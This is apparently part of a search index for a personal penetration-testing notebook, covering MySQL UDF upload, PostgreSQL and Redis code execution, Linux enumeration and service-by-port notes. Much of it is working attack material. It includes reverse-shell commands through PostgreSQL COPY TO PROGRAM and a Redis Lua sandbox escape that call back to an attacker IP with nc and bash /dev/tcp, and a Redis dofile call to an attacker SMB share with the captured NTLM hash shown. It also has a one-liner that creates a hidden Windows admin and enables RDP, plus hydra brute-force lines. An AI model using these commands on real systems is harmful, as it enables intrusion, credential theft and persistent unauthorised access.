hex(load_file('/usr/share/metasploitframework/data/exploits/mysql/lib_mysqludf_sys_64.dll')) into dumpfile\n'/tmp/udf.hex';\n</code></pre>"},{"location":"pentest/enumeration/databases/mysql/#dll-from-raw-hex-literal-in-sql","title":"DLL from Raw Hex Literal in SQL","text":"<pre><code>select\n0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000\n000000\u2026 into dump file \"D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-\nwinx64\\\\lib\\\\plugin\\\\udf.dll\";\n</code></pre>"},{"location":"pentest/enumeration/databases/mysql/#direct-hex-injection-via-sql","title":"Direct Hex Injection via SQL","text":"<pre><code>INSERT INTO temp(data) VALUES (0x4d5a...);\nUPDATE temp SET data = CONCAT(data, 0x...);\nSELECT data FROM temp INTO DUMPFILE 'D:\\\\MySQL\\\\...\\\\plugin\\\\udf.dll';\n</code></pre>"},{"location":"pentest/enumeration/databases/mysql/#load-data-infile-table-dump","title":"LOAD DATA INFILE + Table + Dump","text":"<pre><code>LOAD DATA INFILE '\\\\\\\\192.168.0.19\\\\network\\\\udf.hex'\nINTO TABLE temp FIELDS TERMINATED BY '...' (data);\nSELECT UNHEX(data) FROM temp INTO DUMPFILE '...\\\\udf.dll';\n</code></pre>"},{"location":"pentest/enumeration/databases/mysql/#to_base64-from_base64-mysql-561","title":"TO_BASE64() / FROM_BASE64() (MySQL 5.6.1+)","text":"<pre><code>SELECT TO_BASE64(LOAD_FILE('/path/to/udf.dll')) INTO DUMPFILE '/tmp/udf.b64';\n-- Later:\nSELECT FROM_BASE64(\"base64data...\") INTO DUMPFILE '...\\\\plugin\\\\udf.dll';\n</code></pre>"},{"location":"pentest/enumeration/databases/mysql/#command-line-upload-via-sql-client","title":"Command-line Upload via SQL Client","text":"<pre><code>mysql -h192.168.0.30 -uuser -ppass &lt; /tmp/udf.b64\n</code></pre>"},{"location":"pentest/enumeration/databases/mysql/#exploitation-example","title":"Exploitation example","text":"<pre><code>$ gcc -g -c raptor_udf2.c\n$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n$ mysql -u root -p\nEnter password:\n[...]\nmysql&gt; use mysql;\nmysql&gt; create table foo(line blob);\nmysql&gt; insert into foo values(load_file('/home/raptor/raptor_udf2.so'));\nmysql&gt; select * from foo into dumpfile '/usr/lib/raptor_udf2.so';\nmysql&gt; create function do_system returns integer soname 'raptor_udf2.so';\nmysql&gt; select * from mysql.func;\n+-----------+-----+----------------+----------+\n| name      | ret | dl             | type     |\n+-----------+-----+----------------+----------+\n| do_system |   2 | raptor_udf2.so | function |\n+-----------+-----+----------------+----------+\nmysql&gt; select do_system('id &gt; /tmp/out; chown raptor.raptor /tmp/out');\nmysql&gt; \\! sh\nsh-2.05b$ cat /tmp/out\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)\n</code></pre>"},{"location":"pentest/enumeration/databases/postgresql/","title":"Postgresql","text":""},{"location":"pentest/enumeration/databases/postgresql/#connect-to-database","title":"Connect to Database","text":"<pre><code>psql -U &lt;username&gt; -h &lt;host&gt; -p &lt;port&gt;\n</code></pre>"},{"location":"pentest/enumeration/databases/postgresql/#commands","title":"Commands","text":"<pre><code>\\l\n\\c &lt;DATABASE&gt;\n\\dt\n\\dt *\n\\d &lt;TABLE&gt;\n\\du\n\\du &lt;username&gt;\n\\du *\n</code></pre> <p>Get User Roles and Privileges</p> <pre><code>SELECT   \n      r.rolname,   \n      r.rolsuper,   \n      r.rolinherit,  \n      r.rolcreaterole,  \n      r.rolcreatedb,  \n      r.rolcanlogin,  \n      r.rolconnlimit, r.rolvaliduntil,  \n  ARRAY(SELECT b.rolname  \n        FROM pg_catalog.pg_auth_members m  \n        JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)  \n        WHERE m.member = r.oid) as memberof  \n, r.rolreplication  \nFROM pg_catalog.pg_roles r  \nORDER BY 1;\n</code></pre> <p>Note: Using asterisk can list everything! List database usernames and their hashed passwords</p> <pre><code>select * from pg_shadow;\n</code></pre> <p><code>pg_shadow</code> is a PostgreSQL system catalog (a special internal table)**</p> <p>List content of PostgreSQL's data directory from the server\u2019s perspective</p> <pre><code>select pg_ls_dir('./');\n</code></pre> <p>To read server file from <code>postgres</code></p> <pre><code>pg_read_file(filename text, offset integer, length integer [, missing_ok boolean])\n\nselect pg_read_file('PG_VERSION', 0, 200);\n</code></pre> <p>Create a table and load a local file from the host into it for reading</p> <pre><code>postgres-# CREATE TABLE temp(t TEXT);  \npostgres-# COPY temp FROM '/etc/passwd';\npostgres-# SELECT * FROM temp limit 1 offset 0;\n---------------------------------\n root:x:0:0:root:/root:/bin/bash\n</code></pre>"},{"location":"pentest/enumeration/databases/postgresql/#rce","title":"RCE","text":"<pre><code>COPY (SELECT 'some text') TO PROGRAM 'bash -c \"nc -l -p 1234 -e /bin/bash\"';\n\nCREATE TABLE shell(output text);\nCOPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f';\nCOPY shell FROM PROGRAM 'bash -c \"bash -i 5&lt;&gt; /dev/tcp/192.168.45.238/80 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5\"';\n</code></pre>"},{"location":"pentest/enumeration/databases/redis/redis/","title":"Redis","text":"<pre><code>redis-cli -h &lt;IP&gt;\nredis-cli -h &lt;endpoint&gt; -p &lt;port&gt; -a &lt;password&gt;\n</code></pre> <p>Get KEYS</p> <pre><code>KEYS *\nget &lt;KEYNAME&gt;\n</code></pre> <p>Get <code>redis</code> info</p> <pre><code>INFO\n</code></pre> <p>List all commands</p> <pre><code>COMMAND\n</code></pre> <p>List config file</p> <pre><code>CONFIG GET *\n</code></pre>"},{"location":"pentest/enumeration/databases/redis/redis/#ntlm-hash-disclosure","title":"NTLM Hash Disclosure","text":"<pre><code>eval \"dofile('//ATTACK_IP/SHARE')\" 0\n</code></pre>"},{"location":"pentest/enumeration/databases/redis/redis/#example","title":"Example","text":"<pre><code>10.10.162.45:6379&gt; eval \"dofile('//10.8.101.15/share')\" 0\n(error) ERR Error running script (call to f_d37b7676875406458e4a2e7c04a036406b346aaa): @user_script:1: cannot open //10.8.101.15/share: Invalid argument \n(1.22s)\n</code></pre> <p>SMB-server</p> <pre><code>impacket-smbserver share $(pwd) -smb2support\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Incoming connection (10.10.162.45,49904)\n[*] AUTHENTICATE_MESSAGE (VULNNET\\enterprise-security,VULNNET-BC3TCK1)\n[*] User VULNNET-BC3TCK1\\enterprise-security authenticated successfully\n[*] enterprise-security::VULNNET:aaaaaaaaaaaaaaaa:d44d3df16d22c7585908ae0e658e6ca8:010100000000000000a53bd999e2db017ac06cfd34ea144f000000000100100065004f004f0070004e00710054005a000300100065004f004f0070004e00710054005a00020010004b0055006a0057007300680066004200040010004b0055006a00570073006800660042000700080000a53bd999e2db01060004000200000008003000300000000000000000000000003000004dc4cdf1a6facaa91730e8a8c1ee7264aafb71f4ddb8150cc3effcf74c7c3f7c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e003100300031002e00310035000000000000000000\n[*] Closing down connection (10.10.162.45,49904)\n[*] Remaining connections []\n</code></pre>"},{"location":"pentest/enumeration/databases/redis/sandboxesc/","title":"CVE-2022-0543 Lua Sandbox Escape in Redis","text":"<p>Get <code>redis</code> information</p> <pre><code>192.168.103.166:6379&gt; info\n# Server\nredis_version:5.0.14\n...\n</code></pre> <p>Googled <code>redis 5.0.14 exploit</code> and found CVE-2022-0543</p> <p>Check protected mode status</p> <pre><code>192.168.103.166:6379&gt; CONFIG GET protected-mode\n1) \"protected-mode\"\n2) \"no\"\n</code></pre> <p>Check for <code>module</code> loading</p> <pre><code>192.168.103.166:6379&gt; MODULE LIST\n(empty array)\n192.168.103.166:6379&gt; MODULE LOAD /tmp/doesnotexist.so\n(error) ERR Error loading the extension. Please check the server logs.\n</code></pre> <p>Test code execution</p> <pre><code>192.168.103.166:6379&gt; eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0\n\"uid=107(redis) gid=114(redis) groups=114(redis)\\n\"\n\n192.168.103.166:6379&gt; eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"which nc\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0\n\"/usr/bin/nc\\n\"\n</code></pre> <p>Further googling on <code>luaopen_io for RCE</code> and came across - https://ine.com/blog/cve-20220543-lua-sandbox-escape-in-redis - https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce  </p> <p>Modified the code</p> <pre><code>192.168.103.166:6379&gt; eval 'local os_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_os\"); local os = os_l(); os.execute(\"curl 192.168.45.238\"); return 0' 0\n</code></pre> <p>Check listener</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/ws/pgpractice/readys]\n\u2514\u2500$ rlwrap nc -lvnp 80   \nlistening on [any] 80 ...\nconnect to [192.168.45.238] from (UNKNOWN) [192.168.103.166] 55532\nGET / HTTP/1.1\nHost: 192.168.45.238\nUser-Agent: curl/7.64.0\nAccept: */*\n</code></pre> <p>Remarks: Connection Established!</p> <p>Get Shell</p> <pre><code>192.168.103.166:6379&gt; eval 'local os_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_os\"); local os = os_l(); os.execute(\"/usr/bin/nc -e /bin/bash 192.168.45.238 80\"); return 0' 0\n</code></pre>"},{"location":"pentest/enumeration/linux/checklist/","title":"Checklist","text":""},{"location":"pentest/enumeration/linux/checklist/#enumeration","title":"Enumeration","text":"<ul> <li> Ports, Services</li> <li> Users, Groups</li> </ul>"},{"location":"pentest/enumeration/linux/checklist/#foothold","title":"Foothold","text":"<ul> <li> Users, Groups</li> <li> Privileges</li> <li> Files</li> <li> System</li> <li> Services</li> <li> Environment Variables</li> </ul>"},{"location":"pentest/enumeration/linux/filedir/","title":"Files","text":"<p>Retrieve and display Access Control Lists (ACLs) for the specified directories</p> <pre><code>getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2&gt;/dev/null\n</code></pre> <p><code>-t</code>: This option tells <code>getfacl</code> to display only the ACL entries that are not the default entries (i.e., show only the effective permissions) <code>-s</code>: Remove the \"file\" line from the output <code>-R</code>: This stands for \"recursive.\" It tells <code>getfacl</code> to include all subdirectories and files in the specified paths <code>-p</code>: This option prints only the ACLs of the specified paths without listing the file names. It simplifies the output  Check permissions of  <code>/etc/&lt;FILES&gt;</code></p> <pre><code>ls -ld /etc/{passwd,shadow,sudoers}\n</code></pre> <p>Display writable directory by current user</p> <pre><code>find / -writable -type d 2&gt;/dev/null\nfind / -writable -name \"*.service\" 2&gt;/dev/null\nfind / -type d -perm -0002 2&gt;/dev/null\nfind / -user root -perm -o+w -type f -name \"*.sh\" 2&gt;/dev/null\n</code></pre> <p>Check history file</p> <pre><code>cat ~/.bash_history\n</code></pre> <p>Search for <code>git</code> files</p> <pre><code>find / -name \"*git*\" -type d 2&gt;/dev/null\nfind / -iname \"*git*\" -type d 2&gt;/dev/null\n</code></pre> <p>Check user-specific configuration files</p> <pre><code>.bashrc  \n.bash_profile  \n.bash_logout  \n.zshrc  \n.zprofile  \n.zlogout  \n.profile  \n.kshrc  \n.ssh\n.gitconfig  \n.env  \n.vimrc  \n.viminfo  \n.nano_history  \n.emacs  \n.mysql_history  \n.psql_history  \n.aws/credentials  \n.docker/config.json  \n.bash_history  \n.zsh_history  \n.xinitrc  \n.xprofile  \n.config/*\n</code></pre>"},{"location":"pentest/enumeration/linux/groups/","title":"Groups","text":""},{"location":"pentest/enumeration/linux/groups/#_1","title":"Groups","text":"<p>Display user and group IDs</p> <pre><code>id\n</code></pre> <p>List file related to group</p> <pre><code>find / -group &lt;GROUP&gt; 2&gt;/dev/null\n</code></pre>"},{"location":"pentest/enumeration/linux/groups/#adm","title":"adm","text":"<p>Members can read many log files in <code>/var/log</code> and use <code>xconsole</code></p>"},{"location":"pentest/enumeration/linux/groups/#shadow","title":"shadow","text":"<p>Members can read the /etc/shadow file</p>"},{"location":"pentest/enumeration/linux/groups/#sudoadminwheel","title":"sudo/admin/wheel","text":"<p>sudo/admin (in Debian derivatives) or wheel (in CentOS/RedHat derivatives) group is a special user group used to control access to the su or sudo commands, which allow users to either execute commands or masquerade as another user (usually the super user)</p> <p>/etc/sudoers</p> <pre><code># Members of the admin group may gain root privileges\n%admin ALL=(ALL) ALL\n\n# Allow members of group sudo to execute any command\n%sudo   ALL=(ALL:ALL) ALL\n\n%wheel    ALL=(ALL:ALL) ALL\n</code></pre>"},{"location":"pentest/enumeration/linux/groups/#mlocate","title":"mlocate","text":"<p>Members can read database of indexed files located at <code>var/lib/mlocate/mlocate.db</code></p> <pre><code>cat /var/lib/mlocate/mlocate.db | strings | grep personal -A 3 -B 3\n</code></pre> <p><code>cat /var/lib/mlocate/mlocate.db</code>: Dumps the contents of the locate database     <code>strings</code>: Filters out binary noise to extract readable text (file paths) <code>grep personal -A 3 -B 3</code>: Searches for entries containing the word <code>personal</code>, showing 3 lines before and after each match</p>"},{"location":"pentest/enumeration/linux/groups/#disk","title":"disk","text":"<p>Members have access to the raw data contained in disks and partitions</p>"},{"location":"pentest/enumeration/linux/groups/#lxdlxc","title":"lxd/lxc","text":"<p>Linux Container (LXC)</p> <p>Linux Container Daemon (LXD)</p> <p>Members have write access to the LXD socket and can perform privileged actions, such as creating a root-level privilege container because LXD does not try to match the current users privileges</p>"},{"location":"pentest/enumeration/linux/groups/#docker","title":"docker","text":"<p>Members have access to manage, create, edit or delete docker containers</p>"},{"location":"pentest/enumeration/linux/network/","title":"Network","text":""},{"location":"pentest/enumeration/linux/network/#_1","title":"Network","text":"<p>To display all network connections along with the associated processes and their respective numerical addresses</p> <pre><code>ss -anp\n</code></pre> <p><code>ss</code>: Utility to investigate sockets in Linux <code>-a</code>: Show all sockets (both listening and non-listening) <code>-n</code>: Show numerical addresses and ports instead of resolving hostnames and service names  <code>-p</code>: Show the process using the socket To display network interfaces and IP address information</p> <pre><code>ip a\n</code></pre> <p>To display routing table</p> <pre><code>ip route\nroutel\n</code></pre> <p>To display network connections, listening ports, and statistics</p> <pre><code>netstat -ano\n</code></pre> <p><code>-a</code>: Displays all sockets (listening and non-listening) <code>-n</code>: Disables name resolution (shows IP addresses and ports) <code>-o</code>: Displays the PID of the process using the socket To display the ARP cache or neighbor table</p> <pre><code>arp -a\nip neigh\n</code></pre> <p>To display firewall configurations with custom IP tables</p> <pre><code>cat /etc/iptables/rules.v4\n</code></pre> <p>Display currently mounted file system</p> <pre><code>mount\n</code></pre> <p>Displays the NFS (Network File System) export configuration</p> <pre><code>cat /etc/exports\n</code></pre>"},{"location":"pentest/enumeration/linux/priv/","title":"Privileges","text":""},{"location":"pentest/enumeration/linux/priv/#_1","title":"Privileges","text":"<p>Check user privilege</p> <pre><code>sudo -l\n</code></pre> <p>Display SUID binaries</p> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\nfind / -perm -4000 -type f 2&gt;/dev/null\n</code></pre> <p>Display capabilities</p> <pre><code>/usr/sbin/getcap -r / 2&gt;/dev/null\n</code></pre>"},{"location":"pentest/enumeration/linux/system/","title":"System","text":""},{"location":"pentest/enumeration/linux/system/#_1","title":"System","text":"<p>Display who is logged in and what each user is doing.</p> <pre><code>w\n</code></pre> <p>Display detailed system information including kernel name, version, and architecture.</p> <pre><code>uname -a\n</code></pre> <p>Display the Linux distribution name and version</p> <pre><code>cat /etc/*-release\n</code></pre> <p>Display CPU architecture, supported operation mode, and byte order</p> <pre><code>lscpu | grep -i 'arch\\|op-mode\\|byte'\n</code></pre>"},{"location":"pentest/enumeration/linux/users/","title":"Users","text":"<p>List users with a shell</p> <pre><code>awk -F: '$7 ~ /sh$/ {print $1}' /etc/passwd\n</code></pre> <p><code>-F:</code> \u2192 split each line using : as the separator <code>$7</code> \u2192 The 7th field in each line <code>/sh$/</code> \u2192 Only matches words that end with sh <code>{print $1}</code> \u2192 Shows the first field</p>"},{"location":"pentest/enumeration/ports/110%2C995/","title":"110,995","text":""},{"location":"pentest/enumeration/ports/110%2C995/#post-office-protocol-version-3-pop3","title":"Post Office Protocol version 3 (POP3)","text":""},{"location":"pentest/enumeration/ports/110%2C995/#todo","title":"TODO","text":"<pre><code>USER uid           Log in as \"uid\"\nPASS password      Substitue \"password\" for your actual password\nSTAT               List number of messages, total mailbox size\nLIST               List messages and sizes\nRETR n             Show message n\nDELE n             Mark message n for deletion\nRSET               Undo any changes\nQUIT               Logout (expunges messages if no RSET)\nTOP msg n          Show first n lines of message number msg\nCAPA               Get capabilities\n</code></pre>"},{"location":"pentest/enumeration/ports/111%2C2049/","title":"111,2049","text":""},{"location":"pentest/enumeration/ports/111%2C2049/#network-file-system-nfs","title":"Network File System (NFS)","text":"<pre><code>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount &lt;TARGET_IP&gt;\n</code></pre> <pre><code>showmount -e &lt;IP&gt;\n\nshowmount -e 10.10.14.179                           \nExport list for 10.10.14.179:\n/home/ubuntu/sharedfolder *\n/tmp                      *\n/home/backup              *\n</code></pre> <pre><code>sudo mount &lt;TARGET IP&gt;:&lt;REMOTE DIRECTORY&gt; &lt;LOCAL DIRECTORY&gt;\nsudo mount -o rw 10.10.14.179:/tmp ~/pnpt/nfs\n</code></pre>"},{"location":"pentest/enumeration/ports/111%2C2049/#todo","title":"TODO","text":""},{"location":"pentest/enumeration/ports/135/","title":"135","text":""},{"location":"pentest/enumeration/ports/135/#remote-procedure-call-rpc","title":"Remote Procedure Call (RPC)","text":"<pre><code>rpcclient -U \"\" &lt;IP&gt;\nrpcclient -U \"\" -N &lt;IP&gt;\nrpcclient -U &lt;USERNAME&gt;%&lt;PASSWORD&gt; &lt;IP&gt;\nrpcclient -U Administrator%Ignite@123 192.168.1.172\n</code></pre> <p>rpcclient $&gt;  </p> <p>Domain Information Query</p> <pre><code>querydominfo\nenumdom\nenumdomains\ndsr_enumtrustdom\ngetdompwinfo\n</code></pre> <p>Domain Controller Query</p> <pre><code>srvinfo\nlsaquery\n</code></pre> <p>Group Query</p> <pre><code>enumdomgroups \nenumalsgroups builtin\nquerygroupmem519\nqueryaliasmem builtin 0x220\nquerygroup 0x200\n</code></pre> <p>User Query</p> <pre><code>enumdomusers\nquerydispinfo\nqueryuser RID\nqueryuser &lt;USERNAME&gt;\nlookupsids SID\nenumprivs\n</code></pre> <p>Create Domain User</p> <pre><code>createdomuser hacker \nsetuserinfo2 hacker 24 Password@1 \nenumdomusers\n</code></pre> <p>Info level 24 sets only the user's password without modifying any other account details</p> <p>Note: Misconfigured Settings/Privilege Account can create domain user</p> <p>Change User Password</p> <pre><code>chgpasswd &lt;USER&gt; &lt;CURRENT_PASSWORD&gt; &lt;NEW_PASSWORD&gt;\nchgpasswd raj Password@1 Password@987\n</code></pre>"},{"location":"pentest/enumeration/ports/139%2C445/","title":"139,445","text":""},{"location":"pentest/enumeration/ports/139%2C445/#server-message-block-smb","title":"Server Message Block (SMB)","text":"<p>List shares</p> <pre><code>smbclient -L \\\\\\\\&lt;TARGET_IP&gt;\\\\\nsmbmap -H &lt;TARGET_IP&gt; -u \"anonymous\"\nnxc smb &lt;TARGET_IP&gt; -u '' -p '' --shares\nnxc smb &lt;TARGET_IP&gt; -u '' -p '' -M spider_plus\nenum4linux -a -u \"\" -p \"\" &lt;TARGET_IP&gt; &amp;&amp; enum4linux -a -u \"guest\" -p \"\" &lt;TARGET_IP&gt;\n</code></pre> <p>Access share</p> <pre><code>smbclient \\\\\\\\&lt;TARGET_IP&gt;\\\\&lt;SHARE&gt;\n</code></pre> <p>Download files</p> <pre><code>recurse ON\nprompt OFF\nmget *\n</code></pre> <p>Generate <code>krb5.conf</code> file</p> <pre><code>nxc smb &lt;TARGET_IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; --generate-krb5-file &lt;KRB5_FILE&gt;\nnxc smb 10.10.11.76 -u ryan.naylor -p 'HollowOct31Nyt' --generate-krb5-file voleur.krb\n</code></pre> <p>Common Shares</p> <pre><code>C$,D$,IPC$\nADMIN$  \nPRINT$ \nFAX$ \nSYSVOL \nNETLOGON\n</code></pre>"},{"location":"pentest/enumeration/ports/143%2C993/","title":"143,993","text":""},{"location":"pentest/enumeration/ports/143%2C993/#internet-message-access-protocol-imap","title":"Internet Message Access Protocol (IMAP)","text":""},{"location":"pentest/enumeration/ports/143%2C993/#todo","title":"TODO","text":"<pre><code>A1 LOGIN username password        Log in with username and password\nA2 SELECT INBOX                   Select the mailbox (e.g. INBOX)\nA3 STATUS INBOX (MESSAGES)        Get status info like message count\nA4 LIST \"\" \"*\"                    List all available mailboxes\nA5 FETCH n BODY[]                 Retrieve full contents of message n\nA6 FETCH n BODY[HEADER]           Retrieve headers of message n\nA6 FETCH n (BODY.PEEK[])          Fetch the entire raw message without setting \\Seen\nA7 FETCH n RFC822.SIZE            Get size of message n\nA7 FETCH n (RFC822)               Fetch the entire raw message\nA8 SEARCH ALL                     Search all messages\nA9 SEARCH UNSEEN                  Search for unread messages\nA10 STORE n +FLAGS (\\Seen)        Mark message n as read\nA11 STORE n +FLAGS (\\Deleted)     Mark message n for deletion\nA12 EXPUNGE                       Permanently delete messages marked \\Deleted\nA13 NOOP                          No operation (keeps connection alive)\nA14 CAPABILITY                    Ask server for supported features\nA15 LOGOUT                        Close the session and log out\n</code></pre>"},{"location":"pentest/enumeration/ports/161/","title":"161","text":""},{"location":"pentest/enumeration/ports/161/#simple-network-management-protocol-snmp","title":"Simple Network Management Protocol (SNMP)","text":"<p>SCAN</p> <pre><code>161/udp   open|filtered snmp\n</code></pre> <p>Note: <code>open|filtered</code> may still respond!</p> <p>Community String Brute-Force </p> <pre><code>onesixtyone \"$IP\" -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt\nonesixtyone 10.10.221.173 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt\n\nhydra -P /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt -f \"$IP\" snmp\n</code></pre> <p>Community String with Metasploit </p> <pre><code>msfconsole -q\nmsf6 &gt; use scanner/snmp/snmp_login\nmsf6 auxiliary(scanner/snmp/snmp_login) &gt; run\n[!] No active DB -- Credential data will not be saved!\n[+] 10.10.221.173:161 - Login Successful: openview (Access level: read-only); Proof (sysDescr.0): Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> <p>Management Information Base (MIB) Query</p> <pre><code>snmpwalk -c &lt;COMMUNITY&gt; -v&lt;1/2c/3&gt; \"$IP\"\nsnmpwalk -c public -v1 -t 10 192.168.50.151\n\n\nsnmp-check -c &lt;COMMUNITY&gt; \"$IP\"\nsnmp-check -c openview \"$IP\"\n</code></pre> <p>Specified MIB Query</p> <pre><code>snmpwalk -c &lt;COMMUNITY&gt; &lt;VERSION&gt; \"$IP\" &lt;Object Identifier&gt;\nsnmpwalk -c openview -v1 10.10.221.173 1.3.6.1.4.1.77.1.2.25 \n</code></pre>"},{"location":"pentest/enumeration/ports/161/#oid-net-snmp-extend-mib","title":"OID: NET-SNMP-EXTEND-MIB","text":"<pre><code>snmpwalk &lt;VERSION&gt; -c &lt;COMMUNITY&gt; \"$IP\" NET-SNMP-EXTEND-MIB::nsExtendObjects\nsnmpwalk -v2c -c public 192.168.150.149 NET-SNMP-EXTEND-MIB::nsExtendObjects\n</code></pre> <p>Reference: - Abusing Linux SNMP for RCE - SNMP Arbitrary Command Execution and Shell</p>"},{"location":"pentest/enumeration/ports/161/#common-oids-for-snmp-enumeration","title":"Common OIDs for SNMP Enumeration","text":"Enumeration Task OID Description System Information <code>1.3.6.1.2.1.1</code> General system info (hostname, uptime, description, etc.) Running Processes <code>1.3.6.1.2.1.25.4.2.1.2</code> Lists currently running processes Installed Software <code>1.3.6.1.2.1.25.6.3.1.2</code> Enumerates installed applications Open TCP Ports <code>1.3.6.1.2.1.6.13.1.3</code> Lists listening TCP ports Open UDP Ports <code>1.3.6.1.2.1.6.13.1.2</code> Lists listening UDP ports User Accounts <code>1.3.6.1.4.1.77.1.2.25</code> Retrieves local user accounts Network Interfaces <code>1.3.6.1.2.1.2.2.1.2</code> Lists network interfaces on the device ARP Table <code>1.3.6.1.2.1.4.22.1.2</code> Retrieves ARP cache (IP-MAC mappings) Routing Table <code>1.3.6.1.2.1.4.21.1</code> Retrieves routing table entries Uptime <code>1.3.6.1.2.1.1.3.0</code> System uptime in ticks Hostname <code>1.3.6.1.2.1.1.5.0</code> Retrieves system hostname Windows Services (if SNMP is enabled) <code>1.3.6.1.4.1.77.1.2.3.1.1</code> Lists running Windows services"},{"location":"pentest/enumeration/ports/21/","title":"21","text":""},{"location":"pentest/enumeration/ports/21/#file-transfer-protocol-ftp","title":"File Transfer Protocol (FTP)","text":"<p>Download all files recursively</p> <pre><code>wget -m --no-passive -P ./loot/ftp \"ftp://anonymous:anonymous@$IP\" -nH\n</code></pre> <p><code>.zshrc</code></p> <pre><code>lootFTP(){\nlocal USER=${2:-anonymous}\nlocal PASS=${3:-''}\nlocal IP=$1\n\nif [[ -z \"$IP\" ]]; then\n        echo \"Usage: lootFTP IP [USER] [PASS]\"\n        return 1\nfi\nwget -m --no-passive-ftp -P ./loot/ftp ftp://\"$USER\":\"$PASS\"@\"$IP\" -nH\n}\n</code></pre>"},{"location":"pentest/enumeration/ports/22/","title":"22","text":""},{"location":"pentest/enumeration/ports/22/#secure-shell-ssh","title":"Secure Shell (SSH)","text":"<pre><code>hydra -l &lt;USER&gt; -p &lt;PASSWORD&gt; -f &lt;IP&gt; ssh\nhydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; -f &lt;IP&gt; ssh\n</code></pre> <p>Config File</p> <pre><code>/etc/ssh/sshd_config\n</code></pre>"},{"location":"pentest/enumeration/ports/25/","title":"25","text":""},{"location":"pentest/enumeration/ports/25/#simple-mail-transfer-protocol-smtp","title":"Simple Mail Transfer Protocol (SMTP)","text":"<pre><code>smtp-user-enum -M VRFY -U &lt;EMAILS/USERS&gt; -t &lt;IP&gt;\n</code></pre>"},{"location":"pentest/enumeration/ports/3389/","title":"3389","text":""},{"location":"pentest/enumeration/ports/3389/#remote-desktop-protocol-rdp","title":"Remote Desktop Protocol (RDP)","text":"<p>Check RDP credentials</p> <pre><code>hydra -l &lt;USER&gt; -p &lt;PASSWORD&gt; -f &lt;TARGET_IP&gt; rdp\nnxc rdp -u &lt;USER&gt; -p &lt;PASSWORD&gt;\n</code></pre> <p>Connect to RDP server</p> <pre><code>xfreerdp3 /v:&lt;TARGET_IP&gt; /u:&lt;USER&gt; /p:&lt;PASSWORD&gt; /drive:&lt;DIRECTORY&gt;,&lt;SHARE&gt; +clipboard /dynamic-resolution\n\nxfreerdp3 /v:10.10.191.87 /u:bitbucket /p:'littleredbucket' /drive:/home/kali/Downloads,SHARE +clipboard /dynamic-resolution\n</code></pre> <p>Enable RDP access on Windows</p> <pre><code>net user /add (Username) (Password) &amp;&amp; net localgroup administrators (Username) /add &amp; net localgroup \"Remote Desktop Users\" (Username) /add &amp; netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes &amp; reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList /v (Username) /t REG_DWORD /d 0 &amp; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v TSEnabled /t REG_DWORD /d 1 /f &amp; sc config TermService start= auto\n\nnet user /add USERNAME PASSWORD &amp;&amp; net localgroup administrators USERNAME /add &amp; net localgroup \"Remote Desktop Users\" USERNAME /add &amp; netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes &amp; reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v USERNAME /t REG_DWORD /d 0 /f &amp; reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f &amp; sc config TermService start= auto\n</code></pre>"},{"location":"pentest/enumeration/ports/389%2C636%2C3268%2C3269/","title":"389,636,3268,3269","text":""},{"location":"pentest/enumeration/ports/389%2C636%2C3268%2C3269/#lightweight-directory-access-protocol-ldap","title":"Lightweight Directory Access Protocol (LDAP)","text":"<p>To retrieve naming contexts</p> <pre><code>ldapsearch -H ldap://&lt;TARGET_IP&gt; -x -s base namingcontexts\n</code></pre> <p><code>-x</code>: Use simple authentication <code>-s</code>: Search scope</p> <p>To retrieve all entries</p> <pre><code>ldapsearch -H \"ldap://&lt;TARGET_IP&gt;\" -x -b \"&lt;BASE_DN&gt;\"\nldapsearch -H \"ldap://&lt;TARGET_IP&gt;\" -x -D 